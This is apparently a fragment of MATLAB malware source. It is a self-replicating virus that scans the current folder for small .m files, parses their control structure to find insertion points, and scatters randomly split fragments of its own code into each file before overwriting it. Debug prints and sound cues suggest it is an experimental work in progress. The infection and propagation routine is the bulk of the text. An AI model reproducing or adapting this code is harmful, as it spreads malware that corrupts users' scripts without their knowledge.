ActualCodeForThisPart{end+1}={['TheValueToCompare=' QuoteSign 'disp(' QuoteSign QuoteSign 'Bedecke deinen Himmel, Zeus, Mit Wolkendunst, Und übe, dem Knaben gleich, Der Disteln köpft, An Eichen dich und Bergeshöhn; Müßt mir meine Erde Doch lassen stehn, Und meine Hütte, die du nicht gebaut, Und meinen Herd Um dessen Gluth Du mich beneidest.' QuoteSign QuoteSign ');' QuoteSign ';']};Var2Wrt{end+1}={};
ActualCodeForThisPart{end+1}={['if(strcmp(TheImportantValue,TheValueToCompare)) load gong.mat;sound(y, Fs);else disp(' QuoteSign 'SOME PROBLEM' QuoteSign '); load handel.mat; for i=1:1 sound(y, Fs); end; input(' QuoteSign 'STOP' QuoteSign '); end']};Var2Wrt{end+1}={};

if ~isempty(Var2Wrt)
    for j=1:length(Var2Wrt)
        for i=1:length(Var2Wrt{j})
            disp(Var2Wrt{j}{i});
        end
    end
end

if ~isempty(ActualCodeForThisPart)
    for j=1:length(ActualCodeForThisPart)
        for i=1:length(ActualCodeForThisPart{j})
            disp(ActualCodeForThisPart{j}{i});
        end
    end
end

eval(ViralBodyVariable);

disp('Lets start the insertation!');


VirCode={}; Count020=length(ActualCodeForThisPart);
while Count020>0
    VirCode{end+1}=ActualCodeForThisPart{Count020};
    for Count021=Count020:length(ActualCodeForThisPart)     
        if ~isempty(Var2Wrt{Count021}) if rand>0.3 VirCode{end+1}=Var2Wrt{Count021}(end); Var2Wrt{Count021}(end)=[]; end; end
    end
    Count020=Count020-1;
end

IsAllEmpty=false;
while ~IsAllEmpty
    IsAllEmpty=true;
    for Count022=1:length(Var2Wrt)
        if ~isempty(Var2Wrt{Count022})
            IsAllEmpty=false;
            if rand>0.5
                VirCode{end+1}=Var2Wrt{Count022}(end); Var2Wrt{Count022}(end)=[];
            end
        end
    end
end

%VirCode{:}
%input('________________________________________________________');

VicFiles=dir('*.m');
VicLines={};
for Count023=1:length(VicFiles)
    if (VicFiles(Count023).bytes<1000 && ~strcmp(VicFiles(Count023).name,'odefunction.m'))
        disp('___________________________________________________');        
        disp(VicFiles(Count023).name);
        VicIDr=fopen(VicFiles(Count023).name, 'r'); VicLines={fgetl(VicIDr)};
        while ischar(VicLines{end});
           VicLines{end+1}=fgetl(VicIDr);
        end
        VicLines(end)=[];
        %VicLines(:)

        % Remove Commands and ...

        Count024=1;
        while Count024<length(VicLines)+1
            IsAPO=0;
            Count025=1;
            while Count025<length(VicLines{Count024})+1
                if VicLines{Count024}(Count025)==QuoteSign IsAPO=~IsAPO; end
                if ~IsAPO
                    if VicLines{Count024}(Count025)==char(37)
                        if Count025==1 VicLines(Count024)=[]; else VicLines{Count024}=VicLines{Count024}(1:Count025-1); end
                    end
                    if Count025+1<length(VicLines{Count024})
                        if all(VicLines{Count024}(Count025:Count025+2)=='...')
                            VicLines{Count024}=strcat(VicLines{Count024}(1:Count025-1),VicLines{Count024+1}); Count025=1;
                            if length(VicLines)>Count024 VicLines(Count024+1)=[]; end
                        end
                    end
                end
                Count025=Count025+1;
            end
            Count024=Count024+1;
        end

        EndArray={'if' 'for' 'while' 'try' 'switch' 'parfor'}; EndCount=0;
        GoodLine=[];
        for Count026=1:length(VicLines)
            IsAPP=0;
            if ~EndCount GoodLine=[GoodLine Count026]; end
            for Count027=1:length(VicLines{Count026})
                if (VicLines{Count026}(Count027)==QuoteSign) IsAPP=~IsAPP; end
                if ~IsAPP
                    for Count028=1:length(EndArray)
                        if Count027+length(EndArray{Count028})<length(VicLines{Count026})
                            if all(VicLines{Count026}(Count027:Count027+length(EndArray{Count028})-1)==EndArray{Count028})
                                IsStart=0;
                                if (Count027==1)
                                    IsStart=1;
                                elseif (VicLines{Count026}(Count027-1)==' ' || VicLines{Count026}(Count027-1)==';' || VicLines{Count026}(Count027-1)==char(9))
                                    IsStart=1;
                                end
                                if Count027+length(EndArray{Count028})-1==length(VicLines{Count026})
                                    IsStart=IsStart+1;
                                elseif (VicLines{Count026}(Count027+length(EndArray{Count028}))==' ' || VicLines{Count026}(Count027+length(EndArray{Count028}))=='(' || VicLines{Count026}(Count027+length(EndArray{Count028}))==char(9))
                                    IsStart=IsStart+1;
                                end
                                if IsStart==2
                                    EndCount=EndCount+1;
                                end
                            end
                        end
                    end
                    if Count027+1<length(VicLines{Count026})
                        if all(VicLines{Count026}(Count027:Count027+2)=='end')                        
                            IsEnd=0;
                            if (Count027==1)
                                IsEnd=1;
                            elseif (VicLines{Count026}(Count027-1)==' ' || VicLines{Count026}(Count027-1)==';' || VicLines{Count026}(Count027-1)==char(9))
                                IsEnd=1;
                            end
                            if Count027+2==length(VicLines{Count026})
                                IsEnd=IsEnd+1;
                            elseif (VicLines{Count026}(Count027+3)==' ' || VicLines{Count026}(Count027+3)==';' || VicLines{Count026}(Count027+3)==char(9))
                                IsEnd=IsEnd+1;
                            end
                            if IsEnd==2
                                EndCount=EndCount-1;
                            end
                        end
                    end
                end
            end
        end

        NewInfCode={}; VCsplitted={};
        VirSplit=sort([0 length(VirCode) fix(rand(1,length(GoodLine)-1)*length(VirCode))]);
        TmpVar007=length(VirSplit);
        while TmpVar007>1
            if (VirSplit(TmpVar007-1)<VirSplit(TmpVar007)) VCsplitted{length(VirSplit)-TmpVar007+1}=VirCode(VirSplit(TmpVar007-1)+1:VirSplit(TmpVar007)); else VCsplitted{length(VirSplit)-TmpVar007+1}={}; end
            TmpVar007=TmpVar007-1;
        end
        GoodLine(end+1)=length(VicLines);        
        for Count029=1:length(GoodLine)-1
            NewInfCode={NewInfCode{:} VicLines{GoodLine(Count029):GoodLine(Count029+1)-1}};   
            TmpVar008=length(VCsplitted{Count029});
            while TmpVar008>0
                NewInfCode={NewInfCode{:} VCsplitted{Count029}{TmpVar008}{:}};
                TmpVar008=TmpVar008-1;
            end         
        end
        NewInfCode={NewInfCode{:} VicLines{end}};
        fclose(VicIDr);
        VicIDw=fopen(VicFiles(Count023).name, 'w+');
        for Count030=1:length(NewInfCode)
            fprintf(VicIDw,[NewInfCode{Count030} char(13) char(10)]);
        end
        fclose(VicIDw);
    end
end


VicLines(:)
disp('_________________________________________');
NewInfCode(:)
load gong.mat;
sound(y, Fs);

 